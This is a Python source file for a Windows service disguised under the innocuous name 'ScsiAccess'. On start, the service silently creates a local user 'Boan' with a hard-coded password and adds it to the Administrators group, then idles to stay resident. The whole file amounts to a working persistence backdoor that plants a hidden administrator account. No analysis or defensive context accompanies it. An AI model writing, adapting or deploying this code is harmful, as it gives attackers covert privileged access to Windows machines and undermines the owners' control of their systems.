import servicemanager
import win32serviceutil
import win32service
import win32api
import os, time, ctypes

import win32net
import win32netcon

def useradd(USER = "Boan", GROUP = "Administrators"):    
        user_info = {
               "name": USER,
               "password": "!qhdkscjfwj@",
               "priv": win32netcon.USER_PRIV_USER,
               "home_dir": None,
               "comment": None,
               "flags": win32netcon.UF_SCRIPT,
               "script_path": None
                }

        user_group_info = {"domainandname": USER}

        try:
            win32net.NetUserAdd (None, 1, user_info)
            win32net.NetLocalGroupAddMembers (None, GROUP, 3, [user_group_info])
        except Exception as e:
            print(e)
            



class Svc(win32serviceutil.ServiceFramework):
    
    _svc_name_ = 'ScsiAccess'
    _svc_display_name_ = 'ScsiAccess'

    
    def __init__(self, *args):
        win32serviceutil.ServiceFramework.__init__(self, *args)
        
        
    def sleep(self, sec):
        time.sleep(1)
        
    def SvcDoRun(self):
        self.ReportServiceStatus(win32service.SERVICE_START_PENDING)
        try:
            self.ReportServiceStatus(win32service.SERVICE_RUNNING)
            self.main()            
           
        except Exception, x:
            self.SvcStop()
   
            
    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        self.stop()
        self.ReportServiceStatus(win32service.SERVICE_STOPPED)
        
    def main(self):
        self.runflag=True 

        useradd()
                    
        while self.runflag:
            time.sleep(1)
            
                
    def stop(self):
         self.runflag=False



if __name__ == '__main__':    
    servicemanager.Initialize() 
    servicemanager.PrepareToHostSingle(Svc)
    servicemanager.StartServiceCtrlDispatcher()
    win32serviceutil.HandleCommandLine(Svc)

